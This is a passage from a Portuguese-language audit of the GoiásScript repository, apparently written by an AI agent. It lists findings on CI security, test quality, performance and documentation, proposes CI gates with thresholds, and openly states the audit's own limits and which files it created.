  - Tipos: não há `tsconfig` nem `checkJs` no core. `tsc --allowJs --checkJs` (`probes-qa/checkjs-*.out`): não estrito 6 erros (3 são `resolveJsonModule` ausente na minha config; 3 reais em `src/cli/index.js:341-343`, `catch` com `unknown`); estrito 240 (91 `TS7006`, 91 `TS2339`, 17 `TS18046`; `compiler.js` 54, `bin/goiasscript.js` 48, `src/cli/index.js` 37).
  - O gate determinístico do dono (`quality-pretooluse.mjs`) só vale para `.ts/.tsx`; o core em JS fica fora dos gates de tipagem do dono.
- Regra/critério violado: `coding-style.md` (arquivos 200-400 linhas, 800 máx., funções menores que 50, aninhamento até 4); `code-generation-quality.md` itens 1, 6 e 7.
- Impacto: o estoque de violações é pequeno (9 funções e 1 arquivo) e hoje não há nada que impeça novas; as regras de tipagem do dono não se aplicam ao core.
- Recomendação: promover os limites a `error` com baseline (ratchet) e zerar o estoque; ligar `checkJs` não estrito já (cerca de 3 correções reais) e `strict` por arquivo depois; ou migrar o core para TypeScript, o que também passa a submetê-lo aos hooks do dono (G10, G11).

### [MEDIUM] QA-12 — Segurança do repositório e das dependências sem automação (Dependabot, CodeQL, audit, SECURITY.md)

- Evidência:
  - `gh api repos/Gefferson-Souza/goiasscript`: `dependabot_security_updates: disabled`; `GET .../dependabot/alerts`: 403 "Dependabot alerts are disabled for this repository"; `.../code-scanning/alerts`: 404 "no analysis found"; `.../private-vulnerability-reporting`: `{"enabled": false}`; `.github/dependabot.yml` e `CODEOWNERS`: 404; nenhum `pnpm audit` ou OSV no CI. Positivo: `secret_scanning` e `secret_scanning_push_protection` estão `enabled`.
  - `SECURITY.md:9-10` lista suporte para `1.1.x` e `1.0.x` (a versão atual é 1.5.x) e `:21` manda reportar para `gefferson.souza+security@example.com`; `CODE_OF_CONDUCT.md:36` usa `@example.com`. Não há canal funcional de reporte.
  - Não executei `pnpm audit` (rede restrita), então não há contagem de vulnerabilidades conhecidas nas dependências.
- Regra/critério violado: `security.md` (checklist de segurança; resposta a incidentes); pedido da auditoria (Dependabot, CodeQL, audit).
- Impacto: uma vulnerabilidade em dependência ou no código não gera alerta, e quem a encontrar não tem para onde reportar.
- Recomendação: G16 (Dependabot para npm e github-actions, alertas e security updates ligados, `pnpm audit --audit-level high` ou `osv-scanner`, CodeQL) e atualizar o `SECURITY.md` com um e-mail real e a versão suportada, ligando o private vulnerability reporting (ações do dono).

### [MEDIUM] QA-13 — Workflow sem `permissions`, actions por tag, sem `concurrency`/`timeout`, runs duplicados

- Evidência (`ci.yml`):
  - Sem `permissions:` (herda o padrão do repo: `read`, `can_approve_pull_request_reviews: false`; ok, mas implícito e não portável); `uses:` por tag: `actions/checkout@v4` (`:19,70,95,117`), `pnpm/action-setup@v4` (`:22,73,98,120`), `actions/setup-node@v4` (`:26,76,101,123`), `codecov/codecov-action@v4` (`:46`), `actions/upload-artifact@v4` (`:141`); o repo tem `allowed_actions: all` e `sha_pinning_required: false`.
  - Sem `concurrency`: `push` em `feat/**` e `pull_request` disparam duas execuções para o mesmo commit (runs `26767533935` e `26767537398`); sem `timeout-minutes` (padrão de 360 min); cada um dos 4 jobs refaz `pnpm install`; o playground é compilado duas vezes por execução (`build-apps` `:84-85` e o `webServer` do E2E, `playwright.config.ts:25`); sem cache do browser do Playwright nem de `.next/cache`.
  - Codecov (`:44-51`): sem `token:`, sem `codecov.yml`, sem badge no README, `continue-on-error: true`; o efeito do upload não é verificável.
- Regra/critério violado: pedido da auditoria (permissões do GITHUB_TOKEN, pin por SHA, cache); `security.md`.
- Impacto: risco de cadeia de suprimentos (uma tag de action pode ser movida), desperdício de minutos, e hang de E2E pode ocupar um runner por até 6 h.
- Recomendação: `permissions: contents: read` no topo, actions por SHA (pinact ou Dependabot de `github-actions`), `concurrency` com `cancel-in-progress`, `timeout-minutes`, `zizmor` ou `actionlint` no próprio CI (G9, G16).

### [MEDIUM] QA-14 — Artefatos de falha do E2E não são gerados; `retries` esconde teste flaky

- Evidência:
  - `playwright.config.ts:13`: em CI o reporter é `[['github'], ['list']]`, então `playwright-report/` nunca é criado; `ci.yml:139-145` envia `apps/playground-e2e/playwright-report/` quando há falha (sem arquivos, só um aviso). Os traces (`trace: 'on-first-retry'`, `:16`) e screenshots ficam em `test-results/`, que não é enviado.
  - `:12` `retries: 1` em CI transforma teste flaky em verde sem sinal; `:20-22` só `chromium` e `mobile` (Pixel 5 sobre Chromium), sem Firefox nem WebKit.
  - Positivo: nenhum `waitForTimeout`, `networkidle`, `force: true`, `.only` ou `skip` nos specs; locators por role e label; último run "24 passed (35.2s)" (12 testes x 2 projetos).
- Regra/critério violado: `subagent-delegation-and-ui.md` §2 (evidência observada quando a verificação visual falha).
- Impacto: quando o E2E falhar no CI, não haverá trace nem screenshot para diagnosticar.
- Recomendação: adicionar o reporter `html` em CI e enviar `playwright-report/` e `test-results/`; tratar `flaky` como falha (ou ao menos reportar); `@axe-core/playwright` para acessibilidade; opcionalmente projetos Firefox e WebKit (G15).

### [MEDIUM] QA-15 — Sem testes de robustez e desempenho: transpilação quadrática, NFD, entradas inválidas

- Evidência (`probes-qa/scale-probe.js`, `robust-probe.js`):
  - N literais de string, um por linha: 2k em 65 ms, 4k em 162 ms, 8k em 1,7 s, 16k em 6,4 s, 32k em 21,4 s (cerca de 4x por dobra: O(n²); suspeita pela leitura: restauração de placeholders com `String.replace` em laço, `simpleTranspiler.js:199-201`, após `:76-80`; a causa é leitura de código, o crescimento é medido). 100 000 aspas: 17,2 s; 30 000 `"a`: 1,35 s; 200 mil caracteres sem aspas: 113 ms.
  - O playground limita a 3 s (`apps/playground/lib/use-runner.ts:14`, `worker.terminate()`); o CLI não limita.
  - `é` em NFD (`e` + U+0301) gera "Declaração de variável incompleta"; entrada não-string (`transpile(null)`, `123`, `{}`) devolve erro com "linha 338, coluna 24" do código interno atribuída a `playground.gs`. CRLF, BOM e tabs funcionam.
  - Nenhum teste de timeout, fuzz ou propriedade.
- Regra/critério violado: pedido da auditoria (testes negativos e de borda); `coding-style.md` (validar entrada na fronteira).
- Impacto: um arquivo grande ou malicioso trava o CLI; a regressão de desempenho não é detectada.
- Recomendação: `fast-check` com timeout por caso (G13), normalização `NFC` na entrada, validação de tipo na fronteira de `transpile`, e um benchmark não bloqueante de transpilação (`vitest bench` ou `tinybench`) com entrada de 1 000 linhas e entradas patológicas (G18).

### [MEDIUM] QA-16 — TDD não evidenciado; bugs corrigidos sem teste de regressão

- Evidência (`git show --stat`):
  - Commits de feature e correção sem nenhum arquivo de teste: `a27cd41` (fix de segurança, 3 CRITICAL e 3 HIGH), `2066cac`, `d1ee118`, `93f1a15`. Os testes do Worker e do E2E chegam depois em `a974819` ("test: suite E2E Playwright + testes do Worker + jobs de CI", 2026-06-01); `cacbbcd` acrescenta 5 linhas a `prompt.test.ts`.
  - No core, `5ff2f63` corrige 3 bugs (validação rejeitava `uai { a, b } = obj` e `uai x = valor`; `arma_o_barraco` com caminho absoluto; chaves duplicadas em `metodosGoianos`) e só altera `lexer.test.js` (+14 linhas); nenhum teste cobre desestruturação (`grep "uai {"` vazio) nem `arma_o_barraco`.
  - O histórico não prova o método de trabalho (RED e GREEN podem ter ocorrido localmente antes do commit); por isso está como "não evidenciado", não como violação comprovada.
- Regra/critério violado: `testing.md` ("MANDATORY workflow", RED, GREEN, IMPROVE) e `CONTRIBUTING.md:100` ("TDD preferido").
- Impacto: correções sem regressão reabrem; a cobertura de patch não é exigida em lugar nenhum.
- Recomendação: gate de patch coverage em 80% (Codecov `patch` ou `diff-cover`) e checkbox "teste de regressão incluído" no template de PR (hoje obsoleto, QA-21) (G6).

### [MEDIUM] QA-17 — Regras de idioma e de comentários violadas nos testes e nas configs de gate

- Evidência:
  - `probes-qa/count-pt-ids.js` (identificadores fora de strings e comentários, lista fixa de 20 termos, portanto limite inferior): 232 ocorrências em 8 de 15 arquivos de teste (`compiler.test.js` 98, `errors.test.js` 70, `goianoBuiltins.test.js` 27, `lexer.test.js` 16, `prompt.test.ts` 7, `examples.spec.ts` 6, `rate-limit.test.ts` 5, `security.spec.ts` 3): `resultado` 94, `codigo` 54, `erro` 26, `tipos` 7, `metodos` 5, `metodosProibidos` 5, `quarta` 5, `carregarExemplo` 4, `erroOriginal`, `casos`, `detalhes`, `malicioso`, `chamou`, `marcador`, `abre`, `fecha`.
  - Títulos: os 85 `test()` do core começam com "deve" (ok), mas 15 dos 33 `describe` do core estão em inglês (`Forbidden Methods Detection`, `File Operations`, `CLI Functions`, `Integration Mock Test`, etc.).
  - Comentários nos testes do core: 27 linhas, que narram o que o código faz ou só descrevem o arquivo (R2); 13 em inglês (`compiler.test.js:178,198,209,218,229,234`; `cli.test.js:4,8,12,18,151,155,159`), contra a regra global de português (conflito conhecido com o CLAUDE.md do projeto, que pede inglês para comentários internos). Configs de gate com marcador de fase e pendência: `jest.config.js:17-19`, `.eslintrc.js:32-34`.
  - Nada do `quality-pretooluse.mjs` do dono alcança `.js`.
- Regra/critério violado: CLAUDE.md global e `code-generation-quality.md` item 9 (identificadores em inglês, inclusive em testes); `comments.md` R2 e R3.
- Impacto: dívida de convenção em todo o código de teste; a regra "estrita" do dono não é aplicada onde o hook não chega.
- Recomendação: renomear (codemod seguido de revisão), traduzir os `describe`, apagar os comentários que narram o quê; migrar os testes para TypeScript (o hook passa a valer) ou portar a checagem de idioma para uma regra ESLint (G4); resolver o conflito inglês x português de comentários no CLAUDE.md do projeto.

### [LOW] QA-18 — `tests/setup.js`: console global mockado, helpers mortos, timeout duplicado

- Evidência: `setup.js:10-17` substitui `console.log/error/warn/info` por `jest.fn()` para todos os testes (silencia as mensagens que a produção emite, como os avisos do transpilador); `:25-41` (`captureConsoleOutput`) e `:43-46` (`testGoiasScript`) não têm nenhum uso (`grep` fora do próprio arquivo); `:7` `jest.setTimeout(10000)` repete `jest.config.js:38`; comentários que narram o quê (`:6,9,12,19,24,42`).
- Regra/critério violado: `comments.md` R2; princípio de menor superfície.
- Impacto: avisos reais ficam invisíveis nos testes; manutenção de código sem uso.
- Recomendação: remover o mock global (espiar `console` só onde necessário), apagar os helpers e o timeout duplicado.

### [LOW] QA-19 — Babel é dispensável na suíte

- Evidência: em cópia (`probes-qa/mut/nobabel`), sem `.babelrc`: 85/85; sem `.babelrc` e sem a chave `transform`: 85/85. `.babelrc:6` mira `node: "14"` enquanto `engines` pede `>=18` (`package.json:59`). `@babel/core`, `@babel/preset-env` e `babel-jest` constam em `devDependencies` (`package.json:73-75`). Sem qualquer transformação (`--transform='{}'`) só falha `cli.test.js` (precisa do hoisting de `jest.mock`), o que reforça QA-01.
- Regra/critério violado: princípio de menor superfície.
- Impacto: toolchain extra e alvo de Node desatualizado sem função.
- Recomendação: remover `.babelrc` e a chave `transform` (testado); a remoção dos pacotes pede reinstalação para confirmar. Se migrar para Vitest (G5), o assunto desaparece.

### [LOW] QA-20 — Toolchain defasada

- Evidência (versões instaladas): ESLint 8.57.1 (config legada), Prettier 2.8.8, Jest 29.7.0, Husky 8.0.3, lint-staged 13.3.0, nodemon 2.0.22, commander 10.0.1. Não consultei o registro (rede restrita): que a linha 8.x do ESLint está sem suporte desde 2024-10, que o Prettier 3 e o Husky 9 existem e que `husky install` está obsoleto no v9 é conhecimento prévio, não verificado.
- Regra/critério violado: pedido da auditoria (versão do ESLint e formato de config).
- Impacto: sem correções de segurança e regras novas; migração futura mais cara.
- Recomendação: ESLint 9 flat, Prettier 3, Husky 9 e lint-staged atual junto com G1 a G4 (conferir as versões na hora de executar).

### [LOW] QA-21 — Documentação de qualidade desatualizada ou enganosa

- Evidência: `.github/pull_request_template.md:25-26,53-56` manda rodar `npm test`, `npm run lint` e `npm run build` (não há script `build` na raiz nem no core; o projeto usa pnpm); `.github/copilot-instructions.md:7,10,17` descreve uma arquitetura de arquivo único `goiasscript.js` com `vm.runInNewContext` e VSIX 0.1.0/0.2.0, nada disso existe na 1.5; `KEEP-OR-ARCHIVE.md:55` diz que `goianoBuiltins.test.js` falha (hoje passa); `ISSUE_TEMPLATE/bug_report.md` exemplifica "GoiásScript: [ex: 1.0.3]"; `CHANGELOG.md:97-98` diz "Cobertura 65,17%" (hoje 63,3%); README sem badge de CI nem de cobertura.
- Regra/critério violado: `comments.md` (comentário desatualizável) estendido à documentação; regra de processo "Update docs".
- Impacto: um agente de IA (Copilot) é instruído com arquitetura falsa; contribuidores seguem checklist que não funciona.
- Recomendação: reescrever `copilot-instructions.md`, corrigir o template de PR e o `KEEP-OR-ARCHIVE.md`, adicionar badges ao README quando houver gate real.

### [LOW] QA-22 — `any` nos specs E2E; `playground-e2e` sem `tsconfig`; `test/` do Worker fora do `tsc`

- Evidência: `security.spec.ts:26,28` (`(window as any).monaco`) e `examples.spec.ts:13` (`{ monaco?: any }`); `apps/playground-e2e/` não tem `tsconfig.json` (specs TS não são checados por tipo); `apps/engoianador-api/tsconfig.json:15` inclui só `src/**/*.ts` (com `test/` incluído, `tsc` sai com 0 em `probes-qa/tsconfig.engoianador-tests.json`).
- Regra/critério violado: `code-generation-quality.md` item 1 (sem `any`).
- Impacto: baixo; os specs podem ter erro de tipo sem aviso.
- Recomendação: declarar o tipo de `window.monaco` uma vez, criar `tsconfig` do e2e com `tsc --noEmit` no CI e incluir `test/` no do Worker.

### [LOW] QA-23 — Higiene do repositório

- Evidência: branches remotas `DEVELOPMENT`, `feat/increase-test-coverage`, `feat/v1.5-slim` (já mesclada via #5) e `staging` (o CI cobre `staging`, não `DEVELOPMENT`); `delete_branch_on_merge: false`; `vscode-extension/package-lock.json` rastreado (o `.gitignore` ignora `package-lock.json`, e o pacote está fora de `pnpm-workspace.yaml` e nunca é instalado no CI); sem `.nvmrc`, `.node-version`, `.editorconfig`, `.prettierignore`; diretivas `eslint-disable` sem `-- motivo` em `compiler.js:298` e `runner.worker.ts:73` (esta última inútil, QA-07); 5 arquivos `.vsix` (13,4 MB somados) no diretório de trabalho, ignorados pelo git.
- Regra/critério violado: `code-generation-quality.md` item 8 (diretiva com motivo); pedido da auditoria.
- Impacto: ruído e risco de divergência de ambiente.
- Recomendação: limpar branches mortas, ligar `delete_branch_on_merge`, permitir só squash, adicionar `.nvmrc` (24) e `.editorconfig`, decidir o destino do lock npm da extensão.

### [LOW] QA-24 — Smoke tests do CI só checam exit code e sujam a árvore de trabalho

- Evidência: `ci.yml:53-58` roda `--version`, `dedo_de_prosa` e `traduz examples/basic/exemplo.gs`, conferindo só o exit code; localmente `traduz` sai com 0 imprimindo no stderr o aviso falso "O método "console.log(" não é goiano" (reproduzido, `probes-qa/smoke-traduz.err`), e grava `packages/core/examples/basic/exemplo.js` na árvore (reproduzi e removi). Nenhum smoke chama `bota_pra_moer`, `vê_se_tá_certo`, `arma_o_barraco` nem o REPL. `ci.yml:60-63` só confere `r.success` do entry browser.
- Regra/critério violado: `subagent-delegation-and-ui.md` §2 (verificar o output real, não o exit code otimista).
- Impacto: o aviso falso e qualquer regressão de saída passam no CI.
- Recomendação: G7 (testes de CLI por subprocesso com asserções de stdout, stderr e exit code, em diretório temporário).

### [LOW] QA-25 — Sem budget de bundle, benchmark ou detecção de código morto

- Evidência: nenhuma ocorrência de `size-limit`, `knip`, `tinybench`, Lighthouse, `axe` ou similares no repo (busca em `*.json,yml,yaml,js,ts,md`). Baseline medido do que o playground empacota via `goiasscript/browser`: 35.156 bytes brutos e 9.909 bytes em gzip somando `browser.js`, `simpleTranspiler.js`, `GoianoBuiltins.js`, `ErroGoiano.js` e `errorTranslator.js` (sem bundler; reaferir). Código morto confirmado manualmente: `lexer.js` e 7 métodos de `GoianoBuiltins` sem chamador (QA-01).
- Regra/critério violado: pedido da auditoria (size budgets, benchmarks).
- Impacto: regressões de tamanho, desempenho e código morto passam despercebidas.
- Recomendação: G17 e G18.

## Conformidade com as regras

Legenda: OK = conforme; PARCIAL = atende em parte; FALHA = violação; NÃO EVIDENCIADO = sem prova nem contraprova.

| Regra (fonte) | Estado | Contagem e exemplos |
|---|---|---|
| Identificadores em inglês, inclusive em testes | FALHA | 232 ocorrências (limite inferior) em 8 de 15 arquivos de teste; `resultado` 94, `codigo` 54 |
| Títulos de teste em português | PARCIAL | 85/85 `test()` começam com "deve"; 15 de 33 `describe` do core em inglês |
| Nada de inglês na experiência do usuário (regra de ouro do projeto) | FALHA | nenhum teste ou gate de CLI, REPL ou `--help`; CLI em 0% |
| Comentários R1 a R4 | FALHA | 27 linhas de comentário nos testes do core narram o quê; 13 em inglês; marcador de fase em `jest.config.js:17-19` e `.eslintrc.js:32-34` |
| Sem `any` | PARCIAL | 3 `any` em specs E2E; core em JS sem `checkJs` (regra não verificável) |
| Sem `console.log`/usar logger | FALHA | 45 `no-console` (39 em `src/cli/index.js`, 3 em `ErroGoiano.js`, 3 em `tests/setup.js`) |
| `eslint-disable` com `-- motivo` | PARCIAL | 2 diretivas, nenhuma com `-- motivo`; 1 inútil |
| Arquivos até 400 (alvo) e 800 (máx.); funções menores que 50; aninhamento até 4 | PARCIAL | 0 arquivos acima de 800; 1 acima de 400 (`bin/goiasscript.js`); 9 funções acima de 50; 0 violações de profundidade; 4 funções com complexidade acima de 10 |
| TDD (RED, GREEN, REFACTOR) | NÃO EVIDENCIADO | 4 commits de feature/fix sem teste; testes depois em `a974819`; `5ff2f63` sem regressão |
| Cobertura mínima de 80% | FALHA | 63,3% declarado, 36,1% com `bin/`; threshold 50% |
| Unit, integração e E2E | PARCIAL | unit: core 85, Worker 16; integração: 0; E2E só do playground (12 testes x 2 projetos) |
| Testar comportamento, não implementação | PARCIAL | core 32/85 (38%); Worker 16/16; E2E 12/12 |
| Testes independentes | OK | passam com 3 seeds aleatórias, `--runInBand` e isolados |
| Casos de borda e erro | PARCIAL | Worker (fail-closed) bom; core sem negativos relevantes; 0 fuzz |
| Segurança de CI e repo | PARCIAL | OK: sem `secrets.*`, secret scanning, push protection, `permissions` padrão `read`; FALHA: Dependabot, CodeQL, audit, `permissions` explícito, pin por SHA, SECURITY.md |
| Conventional Commits | PARCIAL | 47/62 (75%); 24/26 (92%) desde 2026-05-01; sem commitlint |
| CI verde antes do push; checks obrigatórios | FALHA | sem hooks, sem proteção de branch |
| Review antes de merge | FALHA | PRs #5 e #6 sem review |
| Gate determinístico do dono cobre este repo | FALHA | `quality-pretooluse.mjs` só `.ts/.tsx`; core é `.js` |

## Proposta: conjunto mínimo de gates para "qualidade impecável"

Prioridade: P0 antes de qualquer reescrita (barato e destrava o resto), P1 junto com a reescrita, P2 depois. Ferramentas citadas não foram instaladas nem executadas por mim (sem rede); conferir versões e compatibilidade na hora de adotar. A coluna "Barraria hoje" usa números medidos nesta auditoria.

| Id | Prio | Gate | Ferramenta concreta | Onde | Limiar | Barraria hoje |
|---|---|---|---|---|---|---|
| G1 | P0 | Hooks locais | Husky 9 + lint-staged (`eslint --max-warnings 0`, `prettier --write` nos staged), commitlint com `@commitlint/config-conventional`, `pre-push` rodando um script `verify` (lint, typecheck, test) | commit e push | 0 warnings | 10 arquivos fora do Prettier; 84 warnings; 15 de 62 commits fora do padrão |
| G2 | P0 | Proteção de `main` | ruleset (ou branch protection): PR obrigatório, checks `test (22.x)`, `test (24.x)`, `build-apps`, `engoianador-test`, `e2e` e o novo `quality`; branch atualizada; sem force-push; histórico linear | GitHub | todos verdes | hoje nada é obrigatório |
| G3 | P0 | Formatação | Prettier 3 com `trailingComma: "all"`, `eslint-config-prettier`, `.prettierignore`; `format:check` bloqueante e cobrindo `apps/*` | pre-commit e CI | 0 divergentes | 10 (core) + 9 (apps) |
| G4 | P0 | Lint | ESLint 9 flat, `typescript-eslint` nos apps, `@vitest/eslint-plugin` ou `eslint-plugin-jest`, `@eslint-community/eslint-plugin-eslint-comments` (`require-description`), `reportUnusedDisableDirectives`; escopo `packages/*/{src,bin,tests}` e `apps/*`; `no-eval` e `no-new-func` como erro | pre-commit e CI | `--max-warnings 0` | 66 erros em `bin/`; 84 warnings |
| G5 | P0 | Oráculo de JS válido e golden | `acorn.parse` (ou `vm.Script`) em todo teste de transpilação; golden data-driven de `examples/**/*.gs` e `templates/**/*.gs` para `.expected.js` e saída executada em `vm` com timeout | unit | 100% dos exemplos | 9 de 15 `.gs` inválidos |
| G6 | P0 | Cobertura | incluir `bin/` e `apps/*/src`; thresholds por arquivo (Vitest `coverage.thresholds.perFile`) em escada 65, 75, 80; Codecov `patch` em 80% | CI | 80% | 36,1% real |
| G7 | P0 | CLI e REPL por subprocesso | `node:child_process.spawnSync` ou `execa` sobre `bin/*.js` em diretório temporário: stdout, stderr, exit code, mensagens em português, persistência de variáveis no REPL | integração | cobrir `traduz`, `bota_pra_moer`, `vê_se_tá_certo`, `arma_o_barraco`, `dedo_de_prosa`, `--help` | CLI em 0% |
| G8 | P0 | Pacote | `npm pack --dry-run`, `publint`, instalar o tarball em tmp e rodar `goiasscript --version` e `require('goiasscript/browser')`; checar README e LICENSE no tarball | CI e release | 0 problemas | tarball sem README/LICENSE |
| G9 | P0 | Release e saúde do CI | `release.yml` por tag `v*` com `permissions: id-token: write` e `npm publish --provenance` (ou Trusted Publishing do npm); `permissions: contents: read` no topo; actions por SHA; `concurrency`; `timeout-minutes`; `schedule` semanal e `workflow_dispatch`; matriz Node 22 e 24; actions em majors Node 24 | CI | verde semanal | QA-05, QA-06, QA-13 |
| G10 | P1 | Tipos | `tsc --noEmit --allowJs --checkJs` não estrito agora e `strict` por arquivo (ou migração do core para TS); incluir `test/` e e2e nos `tsconfig` | pre-push e CI | 0 erros | 6 erros (3 reais) não estrito; 240 estrito |
| G11 | P1 | Limites do dono | `max-lines` 400, `max-lines-per-function` 50, `max-depth` 4, `complexity` 10, `max-params` 4 como erro, com baseline e ratchet | CI | 0 novas violações | 9 funções, 1 arquivo, 4 complexidades |
| G12 | P1 | Mutation testing | StrykerJS (`@stryker-mutator/core` com runner de Jest ou Vitest), `mutate` em `src/compiler/**` e `src/errors/**`, `thresholds.break` 60 depois 80, modo `--incremental` em PR | CI (PR de core e noturno) | 60 depois 80 | 23,5% |
| G13 | P1 | Propriedades e fuzz | `fast-check`: transpilação nunca lança; strings preservadas byte a byte; a saída parseia; timeout por entrada | unit | 0 contraexemplos | classes de bug de QA-02 e QA-15 |
| G14 | P1 | Worker | testes do handler `fetch` (todos os status, IP não spoofável, fallback Groq para Workers AI, timeout), cobertura 80% com `@vitest/coverage-v8`; opcional `@cloudflare/vitest-pool-workers` | unit | 80% | 0 de 8 mutantes mortos |
| G15 | P1 | E2E | Playwright com reporter `html`, upload de `playwright-report/` e `test-results/`, teste de escape do sandbox com checagem de CSP, `@axe-core/playwright`, falhar em `flaky`; opcional Firefox e WebKit | CI | 0 flaky | QA-07, QA-14 |
| G16 | P1 | Cadeia de suprimentos | Dependabot (npm e github-actions), alertas e security updates ligados, `pnpm audit --audit-level high` ou `osv-scanner`, CodeQL (`github/codeql-action`), `zizmor` ou `actionlint`; `minimumReleaseAge` do pnpm (conferir a versão do pnpm que o suporta) | CI | 0 high/critical | alertas desligados |
| G17 | P2 | Código morto | `knip` | CI | 0 | `lexer.js` e 7 métodos |
| G18 | P2 | Budgets e benchmark | `size-limit` para `goiasscript/browser` (baseline 9,9 kB gzip sem bundler; reaferir com bundler), Lighthouse CI no playground, `vitest bench` de transpilação (não bloqueante) | CI | budgets | nada hoje |
| G19 | P2 | Higiene | `.nvmrc` (24), `.editorconfig`, squash-only, `delete_branch_on_merge`, SECURITY.md com contato real e private vulnerability reporting | repo | n/a | QA-12, QA-23 |

Ordem sugerida (estimativa minha): G1 a G4 e G9 numa primeira entrega curta (dependem só de configuração), G5 e G6 em seguida (já mudam o que o CI considera verde), G7 e G8 junto com o primeiro PR de reescrita do CLI, e o restante como degraus de ratchet.

## Veredito por módulo/arquivo

| Peça | Veredito | Justificativa |
|---|---|---|
| `packages/core/tests/unit/cli.test.js` | remover | 16/16 tautológicos; passa com o CLI destruído. Substituir por G7 |
| `packages/core/tests/unit/lexer.test.js` | remover (condicionado) | acompanha o destino de `lexer.js`: sai junto se o lexer for removido; reescrever se o lexer virar o pipeline |
| `packages/core/tests/unit/goianoBuiltins.test.js` | refatorar | manter só os 4 de runtime executando o runtime em `vm`; remover 10 de API sem chamador junto com os métodos |
| `packages/core/tests/unit/compiler.test.js` | refatorar | os 18 cenários servem de semente; trocar `toContain` por golden e `expectValidJs`, corrigir títulos (`:197`, `:233`), identificadores em inglês |
| `packages/core/tests/unit/errors.test.js` | manter (ajustar) | comportamental; renomear identificadores e cobrir branches (45%) |
| `packages/core/tests/setup.js` | remover | mock global de `console`, 2 helpers mortos, timeout duplicado |
| `packages/core/tests/fixtures/test-basic.gs` | remover ou promover | nenhum teste usa; gera JS inválido; pode virar golden depois de corrigido |
| `packages/core/jest.config.js` e `.babelrc` | refatorar (ou reescrever ao migrar para Vitest) | thresholds de 50% e escopo só `src`; Babel dispensável |
| `.eslintrc.js` | reescrever | legado ESLint 8, escopo parcial, regras de estilo que conflitam com o Prettier, override com glob que não casa |
| `.prettierrc` | manter (1 ajuste) | `trailingComma: "all"`; criar `.prettierignore`; migrar para Prettier 3 |
| `.husky/` e bloco `lint-staged` | reescrever | não existe hook algum; configuração órfã |
| `.github/workflows/ci.yml` | refatorar | estrutura boa (jobs separados, cache, `needs`, smoke); faltam gates, pin, permissões, matriz, schedule; não reescrever do zero |
| `.github/` (templates, `copilot-instructions.md`, `dependabot.yml`, `CODEOWNERS`, release, CodeQL) | refatorar os templates; reescrever `copilot-instructions.md`; criar os ausentes | conteúdo obsoleto ou inexistente |
| `apps/engoianador-api/test/*` e `vitest.config.ts` | manter e ampliar | 12/15 mutantes mortos nos módulos testados; faltam `index.ts` e `engoiana.ts` |
| `apps/playground-e2e/**` | manter e corrigir | boa base; ajustar reporter e artefatos, adicionar o teste de fronteira real do sandbox |
| `pnpm-workspace.yaml` e scripts da raiz | manter o workspace; refatorar scripts | adicionar um script `verify` e agregados `-r`; hoje `lint`, `format` e `test` só tocam o core |
| `SECURITY.md` | reescrever | contato falso e tabela de versões errada |

Veredito geral: manter a espinha da infraestrutura (workspace pnpm, jobs paralelos do CI, Playwright, Vitest do Worker, secret scanning), reescrever a camada de enforcement e cerca de metade da suíte do core.

## O que vale reaproveitar numa reescrita

- Estilo dos testes do Worker: títulos de comportamento, cenários fail-closed (`rate-limit`, `cors`), helpers `fakeKV` e `makeEnv`, casos de variação de `sanitizeUserText`.
- A suíte Playwright: locators por role e label, `expect.poll`, mocks de rede com `page.route`, projeto mobile, teste de headers/CSP, `webServer` rodando o build de produção, nenhum sleep.
- `errors.test.js` como modelo de contrato das mensagens goianas (com identificadores em inglês).
- Os 18 cenários de `compiler.test.js` (classes, herança, async, promises, try/catch, condicionais) como sementes do golden suite, e os 15 `.gs` do repo, corrigidos, como fixtures.
- Esqueleto do `ci.yml`: jobs paralelos com `needs: test`, `cache: 'pnpm'`, `pnpm/action-setup` lendo `packageManager`, `--frozen-lockfile`, smoke do entry browser, upload de artefato em `failure()`.
- `packageManager`, `engines`, `pnpm-workspace.yaml` e scripts por app; secret scanning e push protection já ligados; `default_workflow_permissions: read`.
- A velocidade da suíte (2,4 s no total) permite rodar tudo no `pre-push`.

## Artefatos gerados, probes e limites

- Ignorados pelo git e gerados por mim no repo: `packages/core/coverage/**` (reescrito por `test:coverage`). Gerado e removido: `packages/core/examples/basic/exemplo.js` (produzido pelo smoke `traduz`; removido). Ao final, `git status` mostra apenas `?? research_notes/`, que não é meu (criado por outra sessão durante esta auditoria). As mudanças recentes em `apps/playground/.next/**` e `apps/playground-e2e/test-results/` também não são minhas.
- Scratchpad `audit/probes-qa/`: logs e exit codes dos 5 comandos (`01..05-*`), `mutate.js` e `mutation-results.json`, `wmut/` (Worker), `conflict-*.json`, `eslint-*.json`, `checkjs-*.out`, `examples-probe.*`, `edge-probe*.out`, `runtime-probe.*`, `sandbox-probe.*`, `scale-probe.*`, `robust-probe.*`, `count-pt-ids.js`, `jest-results.json`, `npm-pack.json`, `gh-*.json`, e as cópias `mut/` e `cov-with-bin/`.
- Limites: não rodei build do playground nem o E2E (instrução); os mutation probes são artesanais, em cópias, e não substituem o Stryker; a contagem de identificadores em português é limite inferior (20 termos); informações de EOL do Node, versões "mais recentes" e nomes de ferramentas recomendadas vêm de conhecimento prévio e precisam de conferência; não executei `pnpm audit`; não disparei workflow (escrita); os logs do CI expiraram (HTTP 410), então a causa do `exit code 1` do `format:check` no CI é inferida das annotations; o escape do sandbox foi demonstrado em Node, não no navegador; as mudanças de configuração recomendadas no GitHub (proteção de branch, Dependabot, reporte privado) dependem do dono.
